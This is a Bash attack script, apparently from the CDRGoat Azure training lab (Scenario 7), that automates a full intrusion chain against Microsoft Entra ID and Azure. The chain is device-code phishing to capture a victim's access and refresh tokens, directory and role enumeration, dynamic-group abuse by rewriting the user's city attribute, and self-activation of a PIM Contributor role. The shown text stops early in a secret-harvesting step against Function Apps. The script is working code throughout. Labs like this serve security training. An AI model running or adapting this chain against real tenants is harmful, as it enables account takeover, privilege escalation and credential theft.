#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===          CDRGoat Azure - Scenario 7              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Phishing campaign — OAuth Device Code flow\n"
  printf "  • Step 2. Post-phish enumeration & dynamic group abuse\n"
  printf "  • Step 3. Dynamic group exploitation\n"
  printf "  • Step 4. Lateral movement via group membership\n"
  printf "  • Step 5. Activate PIM role (Contributor)\n"
  printf "  • Step 6. Resource discovery & secret harvesting\n"
  printf "  • Step 7. App-only auth (stolen creds) + permission discovery + proof output\n"
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1a. Phishing campaign — OAuth Device Code flow (request)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Phishing campaign (OAuth Device Code)  ===" "${RESET}"

step "Launching OAuth Device Code authentication flow"

DEVICE_CLIENT_ID="04b07795-8ddb-461a-bbee-02f9e1bf7b46"   # Microsoft first-party (Azure CLI / PowerShell)
DEVICE_RESOURCE="https://graph.microsoft.com"

USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

spin_start "Requesting device code from login.microsoftonline.com"

set +e
DEVICE_CODE_RESP="$(curl -sS -X POST \
  -H "User-Agent: ${USER_AGENT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=${DEVICE_CLIENT_ID}" \
  --data-urlencode "resource=${DEVICE_RESOURCE}" \
  "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to request device code (curl rc=$CURL_RC)"
  exit 1
fi

if echo "$DEVICE_CODE_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Device code request failed:"
  echo "$DEVICE_CODE_RESP" | jq .
  exit 1
fi

# Extract values
DEVICE_CODE="$(echo "$DEVICE_CODE_RESP" | jq -r '.device_code')"
USER_CODE="$(echo "$DEVICE_CODE_RESP" | jq -r '.user_code')"
VERIFICATION_URL="$(echo "$DEVICE_CODE_RESP" | jq -r '.verification_url')"
EXPIRES_IN="$(echo "$DEVICE_CODE_RESP" | jq -r '.expires_in')"
INTERVAL="$(echo "$DEVICE_CODE_RESP" | jq -r '.interval')"
MESSAGE="$(echo "$DEVICE_CODE_RESP" | jq -r '.message')"

ok "Device code issued successfully"

printf "\n%s%s%s\n" "${BOLD}${YELLOW}" "⚠️  USER ACTION REQUIRED (Simulation successful phishing) ⚠️" "${RESET}"
printf "\n%sIMPORTANT:%s\n" "${BOLD}${RED}" "${RESET}"
printf "  As a victim using incognito mode in your browser do:\n"
printf "   1) Open %s%s%s\n" "${CYAN}" "${VERIFICATION_URL}" "${RESET}"
printf "   2) Enter the code: %s%s%s\n" "${BOLD}${MAGENTA}" "${USER_CODE}" "${RESET}"
printf "   3) Complete authentication + MFA (setup might be needed)\n\n"

printf "      Code expires in  : %s seconds\n\n" "${EXPIRES_IN}"

read -r -p "Press Enter AFTER the victim completes authentication (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1b. Phishing campaign — OAuth Device Code flow (check)
################################################################################
step "Polling token endpoint waiting for victim authentication"

TOKEN_ENDPOINT="https://login.microsoftonline.com/common/oauth2/token"
ACCESS_TOKEN=""
REFRESH_TOKEN=""

while :; do
  spin_start "Waiting for victim authentication"

  set +e
  TOKEN_RESP="$(curl -sS -X POST \
    -H "User-Agent: ${USER_AGENT}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    --data-urlencode "client_id=${DEVICE_CLIENT_ID}" \
    --data-urlencode "code=${DEVICE_CODE}" \
    --data-urlencode "resource=${DEVICE_RESOURCE}" \
    "${TOKEN_ENDPOINT}")"
  CURL_RC=$?
  set -e
  spin_stop

  if [ $CURL_RC -ne 0 ]; then
    err "Token polling failed (curl rc=$CURL_RC)"
    exit 1
  fi

  # Pending states
  if echo "$TOKEN_RESP" | jq -e '.error' >/dev/null 2>&1; then
    ERROR_CODE="$(echo "$TOKEN_RESP" | jq -r '.error')"

    case "$ERROR_CODE" in
      authorization_pending)
        info "Waiting — victim has not completed authentication yet"
        sleep "$INTERVAL"
        continue
        ;;
      slow_down)
        info "Throttled — slowing polling interval"
        sleep $((INTERVAL + 5))
        continue
        ;;
      expired_token)
        err "Device code expired — phishing attempt failed"
        exit 1
        ;;
      access_denied)
        err "Victim denied the authentication request"
        exit 1
        ;;
      *)
        err "Unexpected OAuth error:"
        echo "$TOKEN_RESP" | jq .
        exit 1
        ;;
    esac
  fi

  ACCESS_TOKEN="$(echo "$TOKEN_RESP" | jq -r '.access_token')"
  REFRESH_TOKEN="$(echo "$TOKEN_RESP" | jq -r '.refresh_token')"
  break
done

ok "OAuth authentication completed — access token received"

################################################################################
# Step 1c. Phishing campaign — OAuth Device Code flow (validation)
################################################################################
step "Analyzing obtained Microsoft Graph token"

TOKEN_PAYLOAD="$(echo "$ACCESS_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"

TENANT_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.tid')"
USER_OID="$(echo "$TOKEN_PAYLOAD" | jq -r '.oid')"
UPN="$(echo "$TOKEN_PAYLOAD" | jq -r '.upn // .preferred_username')"

info "Authenticated user context:"
printf "  • Tenant ID : %s%s%s\n" "${YELLOW}" "${TENANT_ID}" "${RESET}"
printf "  • User OID  : %s%s%s\n" "${YELLOW}" "${USER_OID}" "${RESET}"
printf "  • UPN       : %s%s%s\n\n" "${YELLOW}" "${UPN}" "${RESET}"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Post-phish enumeration & dynamic group abuse
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Entra ID enumeration  ===" "${RESET}"

GRAPH_API="https://graph.microsoft.com/v1.0"
AUTHZ_HEADER=(-H "Authorization: Bearer $ACCESS_TOKEN")

#############################################
# 2.1 Enumerate users (streamgoat only)
#############################################
step "Enumerating Entra ID users"
spin_start "Querying /users from Microsoft Graph"

USERS_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  "$GRAPH_API/users?\$filter=startswith(userPrincipalName,'streamgoat')")"

spin_stop

USER_COUNT="$(echo "$USERS_JSON" | jq '.value | length')"

if [ "$USER_COUNT" -eq 0 ]; then
  err "No users with 'streamgoat' prefix found"
else
  ok "Found $USER_COUNT users"
  echo "$USERS_JSON" | jq -r \
    '.value[] | "  • \(.displayName)"'
fi

#############################################
# 2.2 Enumerate groups (streamgoat only)
#############################################
step "Enumerating Entra ID groups"
spin_start "Querying /groups from Microsoft Graph"

GROUPS_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  "$GRAPH_API/groups?\$filter=startswith(displayName,'streamgoat')")"

spin_stop

GROUP_COUNT="$(echo "$GROUPS_JSON" | jq '.value | length')"

if [ "$GROUP_COUNT" -eq 0 ]; then
  err "No streamgoat groups found"
  exit 1
fi

ok "Found $GROUP_COUNT groups"

echo "$GROUPS_JSON" | jq -c '.value[]' | while read -r g; do
  NAME="$(echo "$g" | jq -r '.displayName')"
  ID="$(echo "$g" | jq -r '.id')"
  TYPES="$(echo "$g" | jq -r '.groupTypes | join(",")')"

  printf "  • Group: %s%s%s\n" "$YELLOW" "$NAME" "$RESET"
  printf "    ID   : %s\n" "$ID"
  printf "    Type : %s\n" "${TYPES:-Assigned}"
done

#############################################
# 2.3 Identify Dynamic group and extract rule
#############################################
step "Identifying Dynamic groups and evaluating membership rule"

DYNAMIC_GROUP_ID="$(echo "$GROUPS_JSON" | jq -r '.value[] | select(.groupTypes[]?=="DynamicMembership") | .id')"

if [ -z "$DYNAMIC_GROUP_ID" ]; then
  err "No Dynamic groups detected — attack chain stops here"
  exit 1
fi

spin_start "Querying dynamic membership rule"

GROUP_RULE_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  "$GRAPH_API/groups/${DYNAMIC_GROUP_ID}?\$select=displayName,membershipRule")"

spin_stop

GROUP_NAME="$(echo "$GROUP_RULE_JSON" | jq -r '.displayName')"
GROUP_RULE="$(echo "$GROUP_RULE_JSON" | jq -r '.membershipRule')"

ok "Dynamic group identified"
printf "  • Group name : %s%s%s\n" "$YELLOW" "$GROUP_NAME" "$RESET"
printf "  • Rule       : %s%s%s\n" "$MAGENTA" "$GROUP_RULE" "$RESET"

#############################################
# 2.4 Check group membership BEFORE change
#############################################
step "Checking if compromised user is already a member of any group"
spin_start "Querying /memberOf"

MEMBERSHIP_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  "$GRAPH_API/users/${USER_OID}/memberOf/microsoft.graph.group")"

spin_stop

MEMBER_COUNT="$(echo "$MEMBERSHIP_JSON" | jq '.value | length')"

if [ "$MEMBER_COUNT" -eq 0 ]; then
  info "User is currently NOT a member of any group"
else
  ok "User is a member of $MEMBER_COUNT group(s)"
  echo "$MEMBERSHIP_JSON" | jq -r '.value[].displayName'
fi

#############################################
# 2.5 Check current city attribute
#############################################
step "Checking current city attribute of compromised user"
spin_start "GET /users/${USER_OID} (displayName, city)"

USER_CITY_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  "$GRAPH_API/users/${USER_OID}?\$select=displayName,city")"

spin_stop

USER_NAME="$(echo "$USER_CITY_JSON" | jq -r '.displayName')"
USER_CITY="$(echo "$USER_CITY_JSON" | jq -r '.city')"

if [ "$USER_CITY" = "null" ] || [ -z "$USER_CITY" ]; then
  info "User ${YELLOW}${USER_NAME}${RESET} has no city set"
else
  ok "User ${YELLOW}${USER_NAME}${RESET} current city: ${CYAN}${USER_CITY}${RESET}"
fi

#############################################
# 2.6 Enumerate directory roles assigned to user
#############################################
step "Enumerating directory roles assigned to compromised user"
spin_start "Querying /roleManagement/directory/roleAssignments"

ROLE_ASSIGNMENTS_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  --get \
  --data-urlencode "\$filter=principalId eq '${USER_OID}'" \
  "$GRAPH_API/roleManagement/directory/roleAssignments")"

spin_stop


ROLE_COUNT="$(echo "$ROLE_ASSIGNMENTS_JSON" | jq '.value | length')"

if [ "$ROLE_COUNT" -eq 0 ]; then
  err "No directory roles assigned — attack chain stops"
  exit 1
fi

ok "Found $ROLE_COUNT directory role assignment(s)"

ROLE_DEFS=()

for roleDefId in $(echo "$ROLE_ASSIGNMENTS_JSON" | jq -r '.value[].roleDefinitionId'); do
  ROLE_DEFS+=("$roleDefId")
done

for rd in "${ROLE_DEFS[@]}"; do
  ROLE_NAME="$(curl -sS "${AUTHZ_HEADER[@]}" \
    "$GRAPH_API/roleManagement/directory/roleDefinitions/${rd}" \
    | jq -r '.displayName')"

  printf "  • %s%s%s\n" "$YELLOW" "$ROLE_NAME" "$RESET"
done

#############################################
# 2.7 Enumerate permissions of assigned directory role
#############################################
step "Enumerating effective permissions of assigned directory role"

for rd in "${ROLE_DEFS[@]}"; do
  spin_start "Querying role definition permissions"

  ROLE_DEF_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
    "$GRAPH_API/roleManagement/directory/roleDefinitions/${rd}")"

  spin_stop

  ROLE_NAME="$(echo "$ROLE_DEF_JSON" | jq -r '.displayName')"

  ok "Permissions for role: ${YELLOW}${ROLE_NAME}${RESET}"

  # Extract allowed resource actions
  ACTIONS="$(echo "$ROLE_DEF_JSON" | jq -r '
    .rolePermissions[]
    .allowedResourceActions[]
  ')"

  if [ -z "$ACTIONS" ]; then
    info "No explicit allowed actions found"
  else
    echo "$ACTIONS" | while read -r action; do
      printf "  • %s%s%s\n" "$MAGENTA" "$action" "$RESET"
    done
  fi
done

#############################################
# Operator explanation
#############################################

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The assigned custom role grants the following capability:\n"
printf "  • Update user contact information "$MAGENTA"(including city)"$RESET"\n"
printf "This permission is sufficient to satisfy discovered Dynamic Group\n"
printf "rules based on user attributes. So the plan is to udpdate city\n"
printf "parameter of owned user to become a member of DevOPS group.\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Dynamic group exploitation
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Dynamic Group abuse  ===" "${RESET}"

#############################################
# 3.1 Change city attribute to satisfy rule
#############################################
step "Modifying user attribute: city = Gotham"
spin_start "PATCH /users/${USER_OID}"

HTTP_CODE="$(curl -sS -o /tmp/patch_resp.json -w "%{http_code}" \
  -X PATCH "${AUTHZ_HEADER[@]}" \
  -H "Content-Type: application/json" \
  "$GRAPH_API/users/${USER_OID}" \
  -d '{"city":"Gotham"}')"

spin_stop

if [ "$HTTP_CODE" = "204" ]; then
  ok "User attribute updated successfully (city=Gotham)"
else
  err "Failed to update user attribute (HTTP $HTTP_CODE)"
  info "Graph response:"
  cat /tmp/patch_resp.json | jq . || cat /tmp/patch_resp.json
  exit 1
fi

#############################################
# 3.2 Wait for dynamic group evaluation
#############################################
spin_start "Waiting for Dynamic Group evaluation (≈120 seconds)"
sleep 120
spin_stop

#############################################
# 3.3 Check group membership AFTER change
#############################################
step "Re-checking group membership after attribute manipulation"
spin_start "Querying /memberOf again"

MEMBERSHIP_AFTER_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  "$GRAPH_API/users/${USER_OID}/memberOf/microsoft.graph.group")"

spin_stop

if echo "$MEMBERSHIP_AFTER_JSON" | jq -r '.value[].displayName' | grep -q "$GROUP_NAME"; then
  ok "SUCCESS — user is now a member of dynamic group: ${MAGENTA}${GROUP_NAME}${RESET}"
else
  err "User not yet in group — wait longer or check rule logic"
fi
printf "\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Lateral movement via group membership
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Group-based privilege expansion  ===" "${RESET}"

################################################################################
# 4.1 Enumerate Entra ID (directory) roles assigned to the group
################################################################################
step "Enumerating Entra ID directory roles assigned to group: ${GROUP_NAME}"
spin_start "Graph: roleAssignments"

GROUP_DIR_ROLES_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  --get \
  --data-urlencode "\$filter=principalId eq '${DYNAMIC_GROUP_ID}'" \
  "$GRAPH_API/roleManagement/directory/roleAssignments")"

spin_stop

COUNT="$(echo "$GROUP_DIR_ROLES_JSON" | jq '.value | length')"

if [ "$COUNT" -eq 0 ]; then
  info "No Entra ID directory roles directly assigned to group"
else
  ok "Found $COUNT Entra ID role assignment(s)"

  echo "$GROUP_DIR_ROLES_JSON" | jq -r '.value[].roleDefinitionId' | while read -r rd; do
    ROLE_NAME="$(curl -sS "${AUTHZ_HEADER[@]}" \
      "$GRAPH_API/roleManagement/directory/roleDefinitions/${rd}" \
      | jq -r '.displayName')"

    printf "  • %s%s%s\n" "$YELLOW" "$ROLE_NAME" "$RESET"
  done
fi

################################################################################
# 4.2 Enumerate eligible Entra ID roles (PIM) for the group
################################################################################

step "Enumerating eligible Entra ID (PIM) roles for group"
spin_start "Graph: roleEligibilityScheduleInstances"

ELIG_DIR_JSON="$(curl -sS "${AUTHZ_HEADER[@]}" \
  --get \
  --data-urlencode "\$filter=principalId eq '${DYNAMIC_GROUP_ID}'" \
  "$GRAPH_API/roleManagement/directory/roleEligibilityScheduleInstances")"

spin_stop

COUNT="$(echo "$ELIG_DIR_JSON" | jq '.value | length')"

if [ "$COUNT" -eq 0 ]; then
  info "No eligible Entra ID roles found for group"
else
  ok "Found $COUNT eligible Entra ID role(s)"

  echo "$ELIG_DIR_JSON" | jq -r '.value[].roleDefinitionId' | while read -r rd; do
    ROLE_NAME="$(curl -sS "${AUTHZ_HEADER[@]}" \
      "$GRAPH_API/roleManagement/directory/roleDefinitions/${rd}" \
      | jq -r '.displayName')"

    printf "  • %s%s%s (Eligible)\n" "$MAGENTA" "$ROLE_NAME" "$RESET"
  done
fi


################################################################################
# Step 4.3 Preparation — obtain ARM token (NO subscription discovery)
################################################################################
step "Requesting Azure Resource Manager (ARM) access token"

ARM_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=${DEVICE_CLIENT_ID}" \
  --data-urlencode "grant_type=refresh_token" \
  --data-urlencode "refresh_token=${REFRESH_TOKEN}" \
  --data-urlencode "resource=https://management.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"

ARM_ACCESS_TOKEN="$(echo "$ARM_TOKEN_RESP" | jq -r '.access_token')"

if [ -z "$ARM_ACCESS_TOKEN" ] || [ "$ARM_ACCESS_TOKEN" = "null" ]; then
  err "Failed to obtain ARM access token"
  echo "$ARM_TOKEN_RESP" | jq .
  exit 1
fi

ok "ARM access token acquired"

ARM_API="https://management.azure.com"
ARM_HDR=(-H "Authorization: Bearer $ARM_ACCESS_TOKEN")

# Optional: sanity check tenant-root Authorization provider access
step "Sanity check: tenant-root RBAC provider reachable"
spin_start "ARM: GET /providers/Microsoft.Authorization/roleDefinitions (tenant-root)"

RD_SANITY_CODE="$(curl -sS -o /tmp/rd_sanity.json -w "%{http_code}" \
  "${ARM_HDR[@]}" \
  "$ARM_API/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01")"

spin_stop

if [ "$RD_SANITY_CODE" = "200" ]; then
  ok "Tenant-root Authorization provider is accessible"
else
  err "Tenant-root Authorization provider not accessible (HTTP $RD_SANITY_CODE)"
  info "Response (first 50 lines):"
  head -n 50 /tmp/rd_sanity.json | sed 's/./&/g' || true
  exit 1
fi

AZ_ELIG_JSON="$(curl -sS \
  "${ARM_HDR[@]}" \
  --get \
  --data-urlencode "\$filter=asTarget()" \
  "$ARM_API/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01-preview")"

################################################################################
# Step 4.4 Enumerate Azure RBAC role assignments for DevOPS group only
################################################################################
step "Enumerating Azure RBAC role assignments for DevOPS group"

ELIG_SCOPES="$(echo "$AZ_ELIG_JSON" | jq -r '.value[].properties.scope' | sort -u)"

for SCOPE in $ELIG_SCOPES; do
  spin_start "ARM: roleAssignments at $SCOPE (filtered)"

  RA_JSON="$(curl -sS \
    "${ARM_HDR[@]}" \
    "$ARM_API${SCOPE}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"

  spin_stop

  if echo "$RA_JSON" | jq -e '.error' >/dev/null 2>&1; then
    info "No permission to read roleAssignments"
    continue
  fi

  MATCHES="$(echo "$RA_JSON" | jq -c \
    --arg PID "$DYNAMIC_GROUP_ID" \
    '.value[] | select(.properties.principalId==$PID)')"

  if [ -z "$MATCHES" ]; then
    info "No active RBAC roleAssignments for DevOPS group"
    continue
  fi

  ok "Active RBAC roleAssignments for DevOPS group"

  echo "$MATCHES" | while read -r r; do
    ROLE_DEF_ID="$(echo "$r" | jq -r '.properties.roleDefinitionId')"

    ROLE_NAME="$(curl -sS \
      "${ARM_HDR[@]}" \
      "$ARM_API${ROLE_DEF_ID}?api-version=2022-04-01" \
      | jq -r '.properties.roleName // "UnknownRole"')"

    printf "  • %s%s%s\n" "$YELLOW" "$ROLE_NAME" "$RESET"
  done
done


################################################################################
# Step 4.5 Enumerate eligible Azure RBAC roles (PIM) for the group
################################################################################
step "Enumerating eligible Azure RBAC roles (PIM) for group (tenant-root)"

if echo "$AZ_ELIG_JSON" | jq -e '.error' >/dev/null 2>&1; then
  err "ARM roleEligibilityScheduleInstances returned an error:"
  echo "$AZ_ELIG_JSON" | jq .
  exit 1
fi

ELIG_COUNT="$(echo "$AZ_ELIG_JSON" | jq '.value | length')"

if [ "$ELIG_COUNT" -eq 0 ]; then
  info "No eligible Azure RBAC roles found for group (tenant-root query)"
else
  ok "Found $ELIG_COUNT eligible Azure RBAC role(s) for group"

  echo "$AZ_ELIG_JSON" | jq -c '.value[]' | while read -r e; do
    ROLE_DEF_ID="$(echo "$e" | jq -r '.properties.roleDefinitionId')"
    SCOPE="$(echo "$e" | jq -r '.properties.scope')"
    START="$(echo "$e" | jq -r '.properties.startDateTime // "n/a"')"
    END="$(echo "$e" | jq -r '.properties.endDateTime // "n/a"')"

    ROLE_NAME="$(curl -sS \
      "${ARM_HDR[@]}" \
      "$ARM_API${ROLE_DEF_ID}?api-version=2022-04-01" \
      | jq -r '.properties.roleName // "UnknownRole"')"

    printf "  • %s%s%s (Eligible)\n" "$MAGENTA" "$ROLE_NAME" "$RESET"
    printf "    Scope: %s\n" "$SCOPE"
    printf "    Window: %s -> %s\n" "$START" "$END"
  done
fi

#############################################
# Operator explanation
#############################################

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"

printf "We identified the effective Azure RBAC context for the compromised DevOPS group.\n\n"

printf "ACTIVE ROLE (static RBAC):\n"
printf "  • StreamGoat-PIM-Visibility\n"
printf "    This role does not grant access to Azure resources themselves,\n"
printf "    but allows visibility into RBAC and PIM configuration.\n"
printf "    It is sufficient to discover where privileged access exists.\n\n"

printf "ELIGIBLE ROLE (PIM):\n"
printf "  • Contributor (Eligible)\n"
printf "    Scope: Resource Group \"streamgoat-rg-7\"\n\n"

printf "If activated, Contributor would grant full control over all resources\n"
printf "inside the resource group. This includes the ability to deploy new\n"
printf "resources or modify existing ones.\n\n"

printf "For this attack chain, the preferred next step is not noisy deployment,\n"
printf "but identifying and abusing resources that already exist in the\n"
printf "resource group.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5 Activate PIM role (Contributor)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. PIM activation & resource discovery  ===" "${RESET}"

# 5.1 Locate eligible Contributor record (group-based)

step "Locating eligible Contributor role (PIM)"

ELIG_ITEM="$(echo "$AZ_ELIG_JSON" | jq -c '
  .value[]
  | select(
      .properties.roleDefinitionId
      | endswith("/b24988ac-6180-42a0-ab88-20f7382dd24c")
    )
')"

if [ -z "$ELIG_ITEM" ]; then
  err "Contributor eligibility not found — cannot proceed"
  exit 1
fi

ELIG_SCOPE="$(echo "$ELIG_ITEM" | jq -r '.properties.scope')"
ROLE_DEF_ID="$(echo "$ELIG_ITEM" | jq -r '.properties.roleDefinitionId')"
PRINCIPAL_ID="$(echo "$ELIG_ITEM" | jq -r '.properties.principalId')"
LINKED_ELIG_ID="$(echo "$ELIG_ITEM" | jq -r '.properties.roleEligibilityScheduleId // empty')"
ELIG_ROLE_NAME="$(echo "$ELIG_ITEM" | jq -r '.properties.expandedProperties.roleDefinition.displayName')"

ok "Found Contributor eligibility"
info "Scope        : $ELIG_SCOPE"
info "Role Name    : $ELIG_ROLE_NAME"

#5.2 Build activation request (roleAssignmentScheduleRequests)
step "Preparing PIM activation request (SelfActivate)"

REQ_ID="$(uuidgen | tr '[:upper:]' '[:lower:]')"

ACT_BODY="$(jq -n \
  --arg principalId "$USER_OID" \
  --arg roleDefId "$ROLE_DEF_ID" \
  --arg scope "$ELIG_SCOPE" \
  --arg linked "$LINKED_ELIG_ID" \
  '{
    properties: {
      requestType: "SelfActivate",
      principalId: $principalId,
      roleDefinitionId: $roleDefId,
      justification: "Operational access required",
      scheduleInfo: {
        startDateTime: (now | todateiso8601),
        expiration: {
          type: "AfterDuration",
          duration: "PT5M"
        }
      }
    }
  }
  | (if $linked != "" then .properties.linkedRoleEligibilityScheduleId = $linked else . end)
')"

# 5.3 Submit activation request (CORRECT endpoint)
spin_start "ARM: Submitting PIM activation request"

HTTP_CODE="$(curl -sS -o /tmp/pim_activate.json -w "%{http_code}" \
  -X PUT \
  -H "Authorization: Bearer $ARM_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$ARM_API${ELIG_SCOPE}/providers/Microsoft.Authorization/roleAssignmentScheduleRequests/${REQ_ID}?api-version=2020-10-01-preview" \
  -d "$ACT_BODY")"

spin_stop

# 5.4 Handle activation result
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
  ok "PIM activation request accepted"
else
  err "PIM activation failed (HTTP $HTTP_CODE)"
  info "Response:"
  cat /tmp/pim_activate.json | jq . || cat /tmp/pim_activate.json

  printf "\n%s%s%s\n" "${BOLD}" "---  OPERATOR NOTE  ---" "${RESET}"
  printf "Activation via API is blocked unless explicitly delegated.\n"
  printf "This matches expected Azure RBAC PIM behavior.\n"
  printf "Portal-based activation remains possible with MFA.\n"

  exit 0
fi

# 5.5 Wait & verify active Contributor assignment
spin_start "Waiting for role activation to propagate"
sleep 15
spin_stop

step "Verifying active Contributor role at scope"

RA_VERIFY="$(curl -sS \
  -H "Authorization: Bearer $ARM_ACCESS_TOKEN" \
  "$ARM_API${ELIG_SCOPE}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"

if echo "$RA_VERIFY" | jq -r '
  .value[]?.properties
  | select(.principalId=="'"$USER_OID"'")
  | .roleDefinitionId
' | grep -q "$ROLE_DEF_ID"; then
  ok "Contributor role is ACTIVE"
else
  err "Contributor role not active yet (approval/MFA delay likely)"
  exit 1
fi

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Resource discovery & secret harvesting
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Resource discovery & secret harvesting  ===" "${RESET}"

#############################################
# 6.1 Enumerate resources in Resource Group
#############################################
step "Enumerating resources in target Resource Group"

spin_start "ARM: GET resources"

RES_JSON="$(curl -sS \
  -H "Authorization: Bearer $ARM_ACCESS_TOKEN" \
  "$ARM_API${ELIG_SCOPE}/resources?api-version=2021-04-01")"

spin_stop

if echo "$RES_JSON" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to enumerate resources"
  echo "$RES_JSON" | jq .
  exit 1
fi

RES_COUNT="$(echo "$RES_JSON" | jq '.value | length')"
ok "Found $RES_COUNT resources"

echo "$RES_JSON" | jq -r '
  .value[] | "  • \(.type)  →  \(.name)"
'

#############################################
# 6.2 Identify Azure Function Apps
#############################################
step "Identifying Azure Function Apps"

FUNC_APPS="$(echo "$RES_JSON" | jq -c '
  .value[]
  | select(.type=="Microsoft.Web/sites")
')"

if [ -z "$FUNC_APPS" ]; then
  err "No Function Apps found in Resource Group"
  exit 1
fi

FUNC_COUNT="$(echo "$FUNC_APPS" | wc -l | tr -d ' ')"
ok "Found $FUNC_COUNT Function App(s)"

#############################################
# 6.3 Read Function App application settings (env vars)
#############################################
step "Retrieving Function App application settings"

# Extract the single Function App name
APP_NAME="$(echo "$FUNC_APPS" | jq -r '.name')"

